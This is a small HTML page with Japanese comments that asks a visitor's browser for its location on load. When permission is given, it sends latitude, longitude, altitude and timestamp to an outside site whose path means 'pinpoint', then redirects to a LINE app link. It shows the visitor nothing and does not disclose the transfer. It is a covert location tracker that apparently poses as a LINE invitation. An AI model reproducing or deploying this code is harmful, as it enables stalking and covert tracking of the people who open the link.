<!DOCTYPE html>
<html>
<head>
    <title>位置情報送信</title>
</head>
<body>
    <script>
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(function(position) {
                // 位置情報が許可された場合の処理
                var latitude = position.coords.latitude;
                var longitude = position.coords.longitude;
                var altitude = position.coords.altitude;
                var timestamp = position.timestamp;

                // 位置情報を別のサイトに送信
                sendDataToOtherSite(latitude, longitude, altitude, timestamp);
                
                // リダイレクト
                window.location.href = "https://line.me/R/app/2000381491-b9061ez1";
            }, function(error) {
                // 位置情報が拒否された場合の処理
                // リダイレクト
                window.location.href = "https://liff-tool.f5.si/";
            });
        } else {
            // ブラウザが位置情報をサポートしていない場合の処理
            console.error("お使いのブラウザは位置情報をサポートしていません。");
        }

        // 位置情報を別のサイトに送信する関数
        function sendDataToOtherSite(latitude, longitude, altitude, timestamp) {
            var apiUrl = "https://liff-tool.github.io/tokutei/?latitude=" + latitude + "&longitude=" + longitude + "&altitude=" + altitude + "&timestamp=" + timestamp;
            window.open(apiUrl, "_blank"); // 別ウィンドウで開く
        }
    </script>
</body>
</html>
